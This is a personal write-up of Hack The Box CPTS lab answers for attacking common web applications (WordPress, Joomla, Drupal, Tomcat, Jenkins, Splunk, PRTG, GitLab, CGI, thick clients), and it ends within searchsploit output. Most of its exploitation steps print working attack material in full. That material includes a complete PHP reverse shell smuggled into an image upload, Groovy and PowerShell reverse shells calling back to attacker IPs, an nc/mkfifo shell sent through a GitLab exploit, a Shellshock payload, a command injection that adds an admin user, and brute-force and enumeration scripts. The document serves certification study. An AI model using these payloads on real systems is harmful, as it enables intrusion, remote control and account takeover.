---
title: CPTS labs - 23 Attacking Common Applications
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 23 Attacking Common Applications

Module: [Attacking Common Applications](https://academy.hackthebox.com/module/details/113)

## Setting the Stage

vHosts needed for these questions:

- `app.inlanefreight.local`
- `dev.inlanefreight.local`
- `drupal-dev.inlanefreight.local`
- `drupal-qa.inlanefreight.local`
- `drupal-acc.inlanefreight.local`
- `drupal.inlanefreight.local`
- `blog.inlanefreight.local`

**Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db)**

First, we add the scope list to our /etc/hosts file. Then we save the scope list to the file scope_list. Then we run

```
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 
```

We will see a lot of open ports at 80. Now we will use eyewitness:

```
eyewitness --web -f scope_list -d ~/borrar/eye
```

Results: ew.db


**What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive)**

```
cat scope_list | aquatone -out ~/borrar/aquatone -screenshot-timeout 1000
```

Results: Pages by Similarity


## Content Management Systems (CMS)



**vHosts needed for these questions:**
**blog.inlanefreight.local**

**Enumerate the host and find a flag.txt flag in an accessible directory.**

Browse to http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt

Results: 0ptions_ind3xeS_ftw!


Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).

```
curl -s http://blog.inlanefreight.local/?p=1 | grep plugin 
```

Then browse to http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/ and a blank page is returned. Then try http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt

Results: WP Sitemap Page

**Find the version number of this plugin. (i.e., 4.5.2)**

Results: 1.6.4


**Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?**

```
RUBYOPT='-rlogger' wpscan --url http://blog.inlanefreight.local  -eu   
```

Results: doug


**Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.**

```
RUBYOPT='-rlogger' wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local 
```

Output:

```
[!] Valid Combinations Found:
 | Username: doug, Password: jessica1
```

Results: jessica1

**Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.**

When login into the application a modal is displaying prompting us to confirm our email webadmin@inlanefreight.local

Results: webadmin

**Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.**

We intercept the request for uploading an image and we upload a pentestmonkey reverse shell:

```html
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: blog.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------11335875238744126981755578650
Content-Length: 3462
Origin: http://blog.inlanefreight.local
Connection: keep-alive
Referer: http://blog.inlanefreight.local/?p=1
Cookie: wordpress_41b86925a9649ab021037fd033e676e4=doug%7C1738678857%7Crvhq8aaCVwCyCHKdisujDmB95zK2vWaPrRIhpn6RY1E%7Ce43a022a4a0c1ae3b4e237eb71b27ab3d6c0d037f344c0cd7a79eddbe5c823d3; wordpress_test_cookie=WP+Cookie+check; wpdiscuz_hide_bubble_hint=1; wp-settings-time-2=1738506386; comment_author_email_41b86925a9649ab021037fd033e676e4=doug.douglas@inlanefreight.local; comment_author_41b86925a9649ab021037fd033e676e4=Doug%20Douglas; wordpress_logged_in_41b86925a9649ab021037fd033e676e4=doug%7C1738678857%7Crvhq8aaCVwCyCHKdisujDmB95zK2vWaPrRIhpn6RY1E%7C69b9802a59cf0d79179d2c0a8cde61c18e4991196c4dc68669f918f78586cce5

-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="action"

wmuUploadFiles
-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="wmu_nonce"

2bcdf6e4cb
-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="wmuAttachmentsData"

undefined
-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="wmu_files[0]"; filename="mala.php"
Content-Type: application/octect-stream

ÿØÿà JFIF  ` `  ÿþ ;		
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.145';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
-----------------------------11335875238744126981755578650
Content-Disposition: form-data; name="postId"

1
-----------------------------11335875238744126981755578650--
```

The server return the target location of the upload. Now in our kali attacker machine:

```
nc -lnvp 1234
```

And we browse to http://blog.inlanefreight.local/wp-content/uploads/2025/02/mala-1738507185.1412.php to receive the reverse shell. Now, from the terminal we browse around and print out the flag:

```
cat /var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
```

Results: l00k_ma_unAuth_rc3!


**vHosts needed for these questions:**
**app.inlanefreight.local**

**Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)**

```
droopescan scan joomla --url http://$target/
curl http://app.inlanefreight.local/administrator/manifests/files/joomla.xml

```

Results:  3.10.0


**Find the password for the admin user on http://app.inlanefreight.local**

```
sudo python3 joomla-brute.py -u http://$target -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

Results:  turnkey


vHosts needed for these questions:
dev.inlanefreight.local

Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application

```
sudo python3 joomla-brute.py -u http://$target -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
# Output: 
# admin:admin

# In my case I entered as admin:admin and modify the index.php template to include a pentesmonkey reverse shell. After that:
cat /var/www/html/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
```

Result: j00mla_c0re_d1rtrav3rsal!

**vHosts needed for these questions:**
**drupal.inlanefreight.local**
**drupal-qa.inlanefreight.local**

**Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local**

```
 curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
# Output
# Drupal 7.30, 2014-07-24
```

Results: 7.30

**Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.**

```
# Go to http://drupal.inlanefreight.local/admin/modules
# Find PHP Filter and enable it
# Next, we could go to Content --> Add content and create a `Basic page`.
# We will paste a pentesmonkey reverse shell and will have a listener ready in our kali machine
# After getting a shell, print the flag:
cat /var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt

```

Resutls: DrUp@l_drUp@l_3veryWh3Re!



## Servlet Containers/Software Development


vHosts needed for these questions:

- `app-dev.inlanefreight.local`
- `web01.inlanefreight.local`

**What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?**

```
curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat 
```

Results: 10.0.10


**What role does the admin user have in the configuration example?**

See the example provided by HTB. 

Results: admin-gui


vHosts needed for these questions:

- `web01.inlanefreight.local`

**Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?**

Run the script [provided in the notes](tomcat-pentesting.md) for brute force user:password:

```
 python tomforce.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt  
```

Results: tomcat

**What is the password?**

Results: root


**Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt**

```
# 1.Generate the WAR file. The payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file.
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

# 2.  Start a listener in your attacking machine:
nc -lnvp 4443

# 3. Upload the file backup.war in the section "WAR file to deploy". Then click on Deploy.

# Find the flag
find / -name tomcat_flag.txt 2>/dev/null

# Cat it
cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
```

Results: t0mcat_rc3_ftw!


vHosts needed for these questions:

- `jenkins.inlanefreight.local`

**Authenticate to (ACADEMY-ATCKAPPS-APP02) with user "admin" and password "admin". Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on.**

See the footer.

Results: 2.303.1


vHosts needed for these questions:

- `jenkins.inlanefreight.local`

**Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory**

Access to jenkins.inlanefreight.local with admin:admin. Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the Script Console located under "Manage Jenkins" tab.

Snippet code for a reverse shell:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.147/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

![](img/jenkins_00.png)

And have a listener in our attacking machine.

```bash
nc -lnvp 1234      
```

Now we cat the flag: 

```
cat var/lib/jenkins3/flag.txt
```

Results: f33ling_gr00000vy!


## Infrastructure/Network Monitoring Tools


**Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3).**

We enumerate the open ports: 

```
sudo nmap $ip -sC -sV --top-ports 10000
```

After noticing port 8000 with Splunk service in it, we access it. Note that we will be accessing with HTTPS. See the title of the site.
Results: 8.2.2


**Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.**

Clone the tool reverse_shell_splunk

```
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
```

Modify the one-liner:

```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.147',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Create a tarball or `.spl` file.

```shell-session
tar -cvzf updater.tar.gz reverse_shell_splunk/
```

Set a listener on the attacking machine:

```
nc -lnvp 1234
```

In the browser go to Manage apps, upload app, and upload your updater.tar.gz. Upon upload, the shell will be triggered. Now print the flag.

```
dir c:\loot
type c:\loot\flag.txt
```

Results: l00k_ma_no_AutH!


**What version of PRTG is running on the target?**

See the footer of http://10.129.48.71:8080/. Also:

```shell-session
curl -s http://$target:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

Results: 18.1.37.13946


**Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop.**

**1.** Access to the application at http://10.129.41.233:8080  with `prtgadmin:Password123`

**2.** To begin, mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`.

**3.** Next, click on Add new notification.

**4.** Give the notification a name and scroll down and tick the box next to EXECUTE PROGRAM. Under Program File, select Demo exe notification - outfile.ps1 from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

**5.** After clicking `Save`, we will be redirected to the `Notifications` page and see our new notification named `pwn` in the list.

**5.** Click the Test button to run our notification and execute the command to add a local admin user. After clicking Test we will get a pop-up that says EXE notification is queued up. 

**6.** Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin. 

**7.** Use crackmapexec / WinRM / RDP / EvilWinRm / impacket toolkit such as wmiexec.py or psexec.py to confirm local admin access.


## Customer Service Mgmt & Configuration Management

vHosts needed for these questions:

- `support.inlanefreight.local`

**Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson.**

Access to `support.inlanefreight.local` with creds facilitated in the lesson: 

```
user: kevin@inlanefreight.local
password: Fish1ng_s3ason!
```

Login page is typically located at: http://$target/scp/login.php

Then, find the ticket that contains a conversation about a VPN password being reset
(the ticket is a little bit hidden, use the search feature):

Results: Inlane_welcome!


vHosts needed for these questions: `gitlab.inlanefreight.local`.

**Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number?**

We access http://gitlab.inlanefreight.local, register an user and browse to http://gitlab.inlanefreight.local:8081/help

Results: 13.10.2

**Find the PostgreSQL database password in the example project.**

Browse to http://gitlab.inlanefreight.local:8081/explore

Then to http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev

And finally to http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev/-/blob/master/phpunit_pgsql.xml

Result: postgres



**Find another valid user on the target GitLab instance.**

We will run the following script:

```
# Exploit Title: GitLab Community Edition (CE) 13.10.3 - User Enumeration
# Date: 4/29/2021
# Exploit Author: @4D0niiS [https://github.com/4D0niiS]
# Vendor Homepage: https://gitlab.com/
# Version: 13.10.3
# Tested on: Kali Linux 2021.1

#!/bin/bash

#Colors
RED='\033[38;5;196m'
GREEN='\e[38;5;47m'
NC='\033[0m'
BOLD='\e[1m'
PINK='\e[38;5;198m'
Italic='\e[3m'
BBlue='\e[44m'
YELLOW='\033[0;33m'

clear
echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e "  			             ${BBlue}${BOLD}GitLab User Enumeration Script${NC}"
echo -e "   	    			             ${BOLD}Version 1.0${NC}\n"
echo -e "${BOLD}${PINK}Description: ${NC}It prints out the usernames that exist in your victim's GitLab CE instance\n"
echo -e "${BOLD}${PINK}Disclaimer: ${NC}${Italic}Do not run this script against ${BOLD}GitLab.com!${NC}${Italic} Also keep in mind that this PoC is meant only"
echo -e "for educational purpose and ethical use. Running it against systems that you do not own or have the"
echo -e "right permission is totally on your own risk.\n${NC}"
echo -e "${BOLD}${PINK}Author:${NC}${BOLD} @4DoniiS${NC}${Italic} [https://github.com/4D0niiS]${NC}"
echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo ""
echo ""



# Usage
usage() {
echo -e "${YELLOW}usage: ./gitlab_user_enum.sh --url <URL> --userlist <Username Wordlist>${NC}\n"

echo -e "${Italic}PARAMETERS:${NC}"
echo -e "-------------"
echo -e "-u/--url	The URL of your victim's GitLab instance"
echo -e "--userlist	Path to a username wordlist file (one per line)"
echo -e "-h/--help	Show this help message and exit"
echo -e "\n"
echo -e "${Italic}Example:${NC}"
echo -e "-------------"
echo -e "./gitlab_user_enum.sh --url http://gitlab.local/ --userlist /home/user/usernames.txt"
}

#check for params
args= ("$@")
URL=""
user_list=""

for (( i=0; i < $#; i++))
{
	case ${args[$i]} in
	--url | -u)
	#GitLab's URL
	URL=${args[$((i+1))]}
	;;
	--userlist)
	#Username wordlist
	user_list=${args[$((i+1))]}
	;;
	-h | --help | "")
	#Help Menu
	usage
	exit 0
	;;
	esac
}


## checking the mandatory parameter (URL)
if [ -z "$URL" ]
then
    usage
    echo ""
    echo -e "${RED}${BOLD}The URL of your GitLab target (--url) is missing. ${NC}"
    exit 0
fi


# User Enumeration Function
enumeration(){

while IFS= read -r line
do
	echo "LOOP"
	HTTP_Code=$( curl -s -o /dev/null -w "%{http_code}" $URL/$line)
	echo $HTTP_Code
	#echo "\n"
	if [ $HTTP_Code -eq 200 ]
	then
 	 echo -e "${GREEN}${BOLD}[+]${NC} The username ${GREEN}${BOLD}$line ${NC}exists!"
	#check the connection
	elif [ $HTTP_Code -eq 000 ]
	then
	 echo -e "${BOLD}${RED}[!]${NC} The target is unreachable. Please make sure that you entered target's URL correctly and you have connection with it!"
	 exit 0
	fi

done < "$user_list"

}



# Main
enumeration
```

Run:

```
./enumuser2.sh -u http://gitlab.inlanefreight.local:8081/ --userlist /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt  | grep [+]
```

Output:

```
[+] The username DEMO exists!
```

Results: DEMO

If we use a different wordlist we will obtain some more users:

```
GitLab User Enumeration in python
[+] The username bob exists!
[+] The username root exists!
[+] The username demo exists!
[+] The username public exists!
[+] The username help exists!
...[SNIP]...
```


**Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.**

As we know that Gitlab [13.10.2](https://www.exploit-db.com/exploits/49951) is vulnerable, we will download the exploit 49951.py.

Then, start a listener:

```
nc -lnvp 1234
```

Running the script:

```
python3.11 49951.py -u lala -p lalala123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.147 1234 >/tmp/f'   -t http://gitlab.inlanefreight.local:8081
```

Now, from the shell:

```
ls -la
cat flag_gitlab.txt
```

Results: s3cure_y0ur_Rep0s!



## Common Gateway Interfaces

**After running the URL Encoded 'whoami' payload, what user is tomcat running as?**

First we enumerate:

```
nmap 10.129.205.30 -Pn -sC -sV -p- --open
```

Output: 

```
Nmap scan report for 10.129.205.30
Host is up (0.27s latency).
Not shown: 64816 closed tcp ports (reset), 705 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ae:19:ae:07:ef:79:b7:90:5f:1a:7b:8d:42:d5:60:99 (RSA)
|   256 38:2e:76:cd:05:94:a6:e7:17:d1:80:81:65:26:25:44 (ECDSA)
|_  256 35:09:69:12:23:0f:11:bc:54:6f:dd:f7:97:bd:61:50 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http          Apache Tomcat 9.0.17
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.17
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 5m29s
| smb2-time: 
|   date: 2025-02-07T21:10:47
|_  start_date: N/A

```

We access the tomcat page http://10.129.205.30:8080/ and check version: # 9.0.17.

This version is potentially vulnerable to `CVE-2019-0232`. If the `enableCmdLineArguments` feature enabled, RCE is possible. 

Now, we enumerate potential vulnerable endpoints:

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat
```

We obtain ẁelcome. Now we can trigger the RCE: http://10.129.205.30:8080/cgi/welcome.bat?&dir

![](img/cgi.png)

Now, 

```
http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

Results: feldspar\omen


**Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.**

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.27/cgi-bin/FUZZ.cgi
gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

Output:  /access.cgi 

Now we can do via curl o via Burpsuite:

```
GET /cgi-bin/access.cgi HTTP/1.1
Host: 10.129.205.27
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.78/1234 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 12 Oct 2020 09:32:54 GMT
If-None-Match: "2aa6-5b175fba24dbe-gzip"
```

In the reverse shell

```
ls -la
cat flag.txt
```

Results: Sh3ll_Sh0cK_123



## Thick Client Applications


**Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password.**

We connect to the machine via RDP:

```
xfreerdp /v:10.129.117.65 /u:cybervaca /p:'&aue%C)}6g-d{w' /cert:ignore
```

We open the tool `ProcMon64` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon) located at c:\Tools\ProcessMonitor\Procmon64.exe. We set the filter "Process name" contains Restart-OracleService

![](img/thick_00.png)

and Start the capture.


We start the C:\Apps\Restart-OracleService.exe program

```
cd C:\Apps\
.\Restart-OracleService.exe 
```

We can see in the process monitor that the temp folder is being written with some content. 

![](img/thick_01.png)

We browse to the Temp folder C:\Users\cybervaca\AppData\Local\Temp and retrieve the .bat file

![](img/thick_02.png)

When opening witht the Notepad, we observe some lines removing some scripts and the executable. We can remove the del lines and execute again the program:

![](img/thick_03.png)

```
.\Restart-OracleService.exe 
```

Now, if we browse to c:\ProgramData we will see the new files monta.ps1, oracle.txt:

![](img/thick_04.png)

We can read the script:

```powershell
cat C:\programdata\monta.ps1
```

```powershell
$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
```

This script simply reads the contents of the `oracle.txt` file and decodes it to the `restart-service.exe` executable. Running this script gives us a final executable that we can further analyze.

![](img/thick_05.png)

Now, we will start procmon64, and modify the filter to catch those process name that contains restart-service string. And we launch the restart-service.

We will  start `x64dbg`, navigate to `Options` -> `Preferences`, and uncheck everything except `Exit Breakpoint`: By unchecking the other options, the debugging will start directly from the application's exit point, and we will avoid going through any `dll` files that are loaded before the app starts.

Then, we can select `file` -> `open` and select the `restart-service.exe` to import it and start the debugging. Once imported, we right click inside the `CPU` view and `Follow in Memory Map`.

![](img/thick_06.png)

We will double click on the first line:

![](img/thick_07.png)

If we double-click on it, we will see the magic bytes `MZ` in the `ASCII` column that indicates that the file is a [DOS MZ executable](https://en.wikipedia.org/wiki/DOS_MZ_executable). Memory-mapped files allow applications to access large files without having to read or write the entire file into memory at once. Instead, the file is mapped to a region of memory that the application can read and write as if it were a regular buffer in memory. This could be a place to potentially look for hardcoded credentials.

![](img/thick_08.png)

Let's return to the Memory Map pane, then export the newly discovered mapped item from memory to a dump file by right-clicking on the address and selecting `Dump Memory to File`.

![](img/thick_09.png)

We run Strings and notice that it  contains a binary:

```
.\strings.exe C:\Users\cybervaca\Desktop\restart-service_0000000000A50000.bin
```

![](img/thick_10.png)

If we open it with dnspy, we will be able to see some creds:

![](img/thick_11.png)

Results: svc_oracle:#oracle_s3rV1c3!2010

**RDP to  (ACADEMY-ACA-PIVOTAPI) with user "cybervaca" and password "&aue%C)}6g-d{w"  What is the IP address of the eth0 interface under the ServerStatus -> Ipconfig tab in the fatty-client application?**

```
xfreerdp /v:10.129.207.80 /u:cybervaca /p:'&aue%C)}6g-d{w' /cert:ignore


ftp 10.129.228.115         
# When prompted, enter credentials anonymous:anonymous
```


## Miscellaneous Applications

**What ColdFusion protocol runs on port 5500?**

Results: server monitor


**What user is ColdFusion running as?**

```
# By accessing the administrator console we see that we are in front of Coldfusion version 8
http://10.129.13.189:8500/CFIDE/administrator/enter.cfm

searchsploit coldfusion 

# Output:
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                        | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                     | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                        | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                         | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                              | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                          | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                         | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                        | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                  | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                     | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                            | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                  | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting               | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scri | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting     | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting      | cfm/webapps/33168.txt
Adobe ColdFusion versions 2018_15 (and earlier) and 2021_5 and earlier - Arbitrary File Read               | multiple/webapps/51875.py
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                        | multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                              | windows/local/19220.c
Allaire ColdFusion Server 4.0/4.0.1 - 'CFCACHE' Information Disclosure                                     | multiple/remote/19712.txt
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                          | cfm/webapps/16788.rb
ColdFusion 9-10 - Credential Disclosure                                                                    | multiple/webapps/25305.py
ColdFusion MX - Missing Template Cross-Site Scripting                                                      | cfm/remote/21548.txt
ColdFusion MX - Remote Development Service                                                                 | windows/remote/50.pl
ColdFusion Scripts Red_Reservations - Database Disclosure                                                  | asp/webapps/7440.txt
